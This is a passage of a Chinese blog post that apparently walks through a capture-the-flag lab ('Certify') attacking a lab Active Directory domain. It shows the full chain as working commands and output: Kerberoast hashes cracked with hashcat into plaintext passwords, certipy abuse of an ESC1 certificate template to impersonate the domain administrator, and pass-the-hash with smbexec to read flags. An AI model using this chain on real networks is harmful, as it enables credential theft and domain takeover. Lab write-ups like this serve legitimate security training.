10713e1f383fddadf124dce3af626f6fdce34eb39d1945934fcd85a050b71d82165d61f4b3268d54cf71ed2cd13115c60df469e67002581228e66b41f7c4249c4a367567f37934c1729fc6ef242b6d9474ed5f7d41da0a9a8ec636f045be550a782fa9ca723fe3e8bd003a872542e80ef04ae924ae965690e137df57fcd74658358b05366a9817a727f0cc18ce6986e5b475278af87ad60e017065d2b1ddc96e33e7ef325850222654a3636d1fd5098bbeddcba18fd0eab3358a729c32d95f6522b09622893385b1c29f01c6047a3fa511a6c66a0e82a0867613564162f207e6aa700da9b0526f70b17d689c5a18315ad96098d86de13a4cd70a046affda0502a3539519045b97663a0849b9134ca30825b9eae274cfead2515eb18a882a48289a50fb2e89d54d5af423aa49596f69d95861045c03d6a1d35670096cbd47776671859a43c38795f7bae39670f14d4daa7fe87544009fcab1e0ba4dcbdba6db07714a2435a473a971774bb7081ad712066989e796e769da63578d639b7674861239f93a8ec6c1530f41a5280f9d4599e5b6b84ae579b575163e81911f8f64fea83f2982293d7c6d959f979802010f6ac51c92142a5ba200f3aa63a4aeec1244053944638cf6b934e4fd380f78288f7b53e2763b8fd3358f2b3a48856be289cd76ccc5c69987a5e7f2f259b2eaef94c495fd4badcfb420c7f90d5731c8c0e26d246f2d395645ea42d0e8029026171200a549d5276302dae85d3</span>

<span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>chenchen<span class="token variable">$XIAORANG</span>.LAB<span class="token variable">$xiaorang</span>.lab/chenchen*<span class="token variable">$0aaceee2e5d59d37503ab50b3576b70e</span><span class="token variable">$cb044405d1b4e07a4fb107a04cc6baa7d0d00c7950a60e094638e77d408a49023b3351cea1eb61fe742b0bda13afa79e2d7834a53ababeea4005f33e5762877cf4e448f7ddf0d1d3c6775ea2a07ffd2b4bd8f00c823509b57ced2fd30b165798a603dece2fb3e0516364fb4ef3698163a2b3cf00b8a01ede054a487973adb719d502f8b9fce01ac6a63a163fb04707d80ce5dccb085c5316d12cd23c8759fcae7c59c5dc0c22463f0bfeab50c6f889dda866d7ebedd4b88978df578c224bba8f4554e8c4908b8c28cd3e1d16ef26cbc9be323ecf5fed517af1473faa710aa3f68eb237bb326e7505eff89f5eb5b58b9102d30711f65eb154ca9f15becef4917ddd383845fbca8d8e9c7b105ba8f14d1c35faae811f1fd5a7f37ae6bd02b5e7e9eaae880379c6ce6da2b292c40e4cd4c4709b9f5a02a9308d0251e96067500da2c0ee2295a20bbf40219a7c26cb20bb614dc3c5ad774e42ee365c1ac614bec5e360a59eac443a5354cc0dfef10d737798258e2d0c143636a86b9126b45b2426b3ed4ecedf3d1ef274e2a575fe92b7c6c8612f00d22b4e4f9cbf8c46250cccab5773a8038ce5adc2050d6e91a057519c19d7ee70e07550981ed92727f5a66248da707132ff3d76eeae8d11e3eabe9f423eb6f1c2ad5e14ffbbe85fb8c7e9a654653272f51a9ea319f439a1ca516370887f6ec99cfeb67d63e769cdf70aed23189033da45a654aca07c48e34d00b30ec43a699a0242b57e77a2e9511135b9dd0a426639d117e3e467c7bcf73bd342f3fd666ee050e2d41e2615a97268bb847bec8cf012c3c1d9b5c6812a0c161886a6084778be1e2a0ce9d58cd9d691dc2388b0907bf00768589f71ca053e965d6343d09b56fbb3068fc6d476047d46acc0a9b940a706fc2bca6d59373acb7db52ae8a41ca8eb21728035044d6e190d637c698cc4b94f7b6f8907431c8f10c9f909b2cb3dd13e75113cdd84d4be1e33dcc3f97bc2b3290e11fcb54cbda9ee4140c64b3d917a57959e101436348f4f8c4344b12c19fcc86a658888395ac6d04ca18ef79c7f15e327cfe700c459da75207dfb3b0c946fe0f95248661b8b3ee44259c402fa02d81535d74a41526bd17ebd8cf9ebe53b196e4a4907ad6318338817cf2d0fa858a6c296cfc79596cbdac45dc827a1b65f4b09596b3f2d15591bed9dcc0fca5439b87e81f5496f71a764ce3bfd937819c5e3f972e35f2988e8d031cfbe1c9a1c60901ff3e05c38c97b25dd7223f8c63c9abc685fdcd2e87b7779d7035d09ee13eb3ac72556c89a607c7f92d4c13593cdeaa231395d87359f03766172a6e9bf132c89862cb7eecd343a831eb46ae144e54010746c918a335c467669358e231f45e0b6115fb7e5c727ad75bd9a3bd45652e78447e49dd02d118226795752b7a3170a3276ea44e54527c209fdabfc926e08d4f05a7bafc0c661b2cb871cd64231dfaf5e05ad2ab187ffcac03388c91783be2e3157cbe26149771d7c6a02cd771b</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>hashcat爆一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-m</span> <span class="token number">13100</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token number">2</span>.txt /usr/share/wordlists/rockyou.txt <span class="token parameter variable">--force</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226105555059.png" alt="image-20250226105555059"></p>
<p>得到</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">xiaorang.lab\zhangxia:MyPass2@@6
xiaorang.lab\chenchen:@Passw0rd@<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>那么就能 RDP 172.22.9.26 上去了</p>
<h1 id="ESC1"><a href="#ESC1" class="headerlink" title="ESC1"></a>ESC1</h1><p>rdp登录成功，但是 flag 在管理员目录下没有权限读 flag，由于存在CA认证服务器结合题目名，尝试查看是否存在错误配置的证书</p>
<p>AD CS 信息</p>
<p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226110322776.png" alt="image-20250226110322776"></p>
<p>Certipy 跑一遍可以利用的证书。参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/318126.html">https://www.freebuf.com/articles/network/318126.html</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains certipy <span class="token function">find</span> <span class="token parameter variable">-u</span> <span class="token string">'liupeng@xiaorang.lab'</span>  <span class="token parameter variable">-password</span> <span class="token string">'fiAzGwEMgTY'</span> -dc-ip <span class="token number">172.22</span>.9.7 <span class="token parameter variable">-vulnerable</span> <span class="token parameter variable">-stdout</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Certificate Authorities
  <span class="token number">0</span>
    CA Name                             <span class="token builtin class-name">:</span> xiaorang-XIAORANG-DC-CA
    DNS Name                            <span class="token builtin class-name">:</span> XIAORANG-DC.xiaorang.lab
    Certificate Subject                 <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>xiaorang-XIAORANG-DC-CA, <span class="token assign-left variable">DC</span><span class="token operator">=</span>xiaorang, <span class="token assign-left variable">DC</span><span class="token operator">=</span>lab
    Certificate Serial Number           <span class="token builtin class-name">:</span> 43A73F4A37050EAA4E29C0D95BC84BB5
    Certificate Validity Start          <span class="token builtin class-name">:</span> <span class="token number">2023</span>-07-14 04:33:21+00:00
    Certificate Validity End            <span class="token builtin class-name">:</span> <span class="token number">2028</span>-07-14 04:43:21+00:00
    Web Enrollment                      <span class="token builtin class-name">:</span> Disabled
    User Specified SAN                  <span class="token builtin class-name">:</span> Unknown
    Request Disposition                 <span class="token builtin class-name">:</span> Unknown
    Enforce Encryption <span class="token keyword">for</span> Requests     <span class="token builtin class-name">:</span> Unknown
Certificate Templates
  <span class="token number">0</span>
    Template Name                       <span class="token builtin class-name">:</span> XR Manager
    Display Name                        <span class="token builtin class-name">:</span> XR Manager
    Certificate Authorities             <span class="token builtin class-name">:</span> xiaorang-XIAORANG-DC-CA
    Enabled                             <span class="token builtin class-name">:</span> True
    Client Authentication               <span class="token builtin class-name">:</span> True
    Enrollment Agent                    <span class="token builtin class-name">:</span> False
    Any Purpose                         <span class="token builtin class-name">:</span> False
    Enrollee Supplies Subject           <span class="token builtin class-name">:</span> True
    Certificate Name Flag               <span class="token builtin class-name">:</span> EnrolleeSuppliesSubject
    Enrollment Flag                     <span class="token builtin class-name">:</span> PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    <span class="token builtin class-name">:</span> <span class="token number">16777216</span>
                                          <span class="token number">65536</span>
                                          ExportableKey
    Extended Key Usage                  <span class="token builtin class-name">:</span> Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           <span class="token builtin class-name">:</span> False
    Requires Key Archival               <span class="token builtin class-name">:</span> False
    Authorized Signatures Required      <span class="token builtin class-name">:</span> <span class="token number">0</span>
    Validity Period                     <span class="token builtin class-name">:</span> <span class="token number">1</span> year
    Renewal Period                      <span class="token builtin class-name">:</span> <span class="token number">6</span> weeks
    Minimum RSA Key Length              <span class="token builtin class-name">:</span> <span class="token number">2048</span>
    Permissions
      Enrollment Permissions
        Enrollment Rights               <span class="token builtin class-name">:</span> XIAORANG.LAB<span class="token punctuation">\</span>Domain Admins
                                          XIAORANG.LAB<span class="token punctuation">\</span>Domain Users
                                          XIAORANG.LAB<span class="token punctuation">\</span>Enterprise Admins
                                          XIAORANG.LAB<span class="token punctuation">\</span>Authenticated Users
      Object Control Permissions
        Owner                           <span class="token builtin class-name">:</span> XIAORANG.LAB<span class="token punctuation">\</span>Administrator
        Write Owner Principals          <span class="token builtin class-name">:</span> XIAORANG.LAB<span class="token punctuation">\</span>Domain Admins
                                          XIAORANG.LAB<span class="token punctuation">\</span>Enterprise Admins
                                          XIAORANG.LAB<span class="token punctuation">\</span>Administrator
        Write Dacl Principals           <span class="token builtin class-name">:</span> XIAORANG.LAB<span class="token punctuation">\</span>Domain Admins
                                          XIAORANG.LAB<span class="token punctuation">\</span>Enterprise Admins
                                          XIAORANG.LAB<span class="token punctuation">\</span>Administrator
        Write Property Principals       <span class="token builtin class-name">:</span> XIAORANG.LAB<span class="token punctuation">\</span>Domain Admins
                                          XIAORANG.LAB<span class="token punctuation">\</span>Enterprise Admins
                                          XIAORANG.LAB<span class="token punctuation">\</span>Administrator
    <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Vulnerabilities
      ESC1                              <span class="token builtin class-name">:</span> <span class="token string">'XIAORANG.LAB\\Domain Users'</span> and <span class="token string">'XIAORANG.LAB\\Authenticated Users'</span> can enroll, enrollee supplies subject and template allows client authentication<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>虽然默认也有 ESC8, 但是因为 AD DS 和 AD CS 是在同一台机器上的, 所以无法进行 NTLM Relay</p>
<p>下面利用 ESC1，参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Adminxe/article/details/129353293">https://blog.csdn.net/Adminxe/article/details/129353293</a></p>
<p>这里注意改一下host，没改host连接会超时，把域里那两条都加上</p>
<p>利用XR Manager模板为域管请求证书</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains certipy req <span class="token parameter variable">-u</span> <span class="token string">'liupeng@xiaorang.lab'</span> <span class="token parameter variable">-p</span> <span class="token string">'fiAzGwEMgTY'</span> <span class="token parameter variable">-target</span> <span class="token number">172.22</span>.9.7 -dc-ip <span class="token number">172.22</span>.9.7 <span class="token parameter variable">-ca</span> <span class="token string">"xiaorang-XIAORANG-DC-CA"</span> <span class="token parameter variable">-template</span> <span class="token string">'XR Manager'</span>  <span class="token parameter variable">-upn</span> administrator@xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>接着转换格式，请求TGT，DCSync或者PTT</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains certipy auth <span class="token parameter variable">-pfx</span> administrator.pfx -dc-ip <span class="token number">172.22</span>.9.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>拿到域管哈希，PTH获取域控权限</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python3 smbexec.py <span class="token parameter variable">-hashes</span> :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.26

<span class="token builtin class-name">type</span> c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>administrator<span class="token punctuation">\</span>flag<span class="token punctuation">\</span>flag03.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python3 smbexec.py <span class="token parameter variable">-hashes</span> :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7

<span class="token builtin class-name">type</span> c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>administrator<span class="token punctuation">\</span>flag<span class="token punctuation">\</span>flag04.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226112142249.png" alt="image-20250226112142249"></p>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>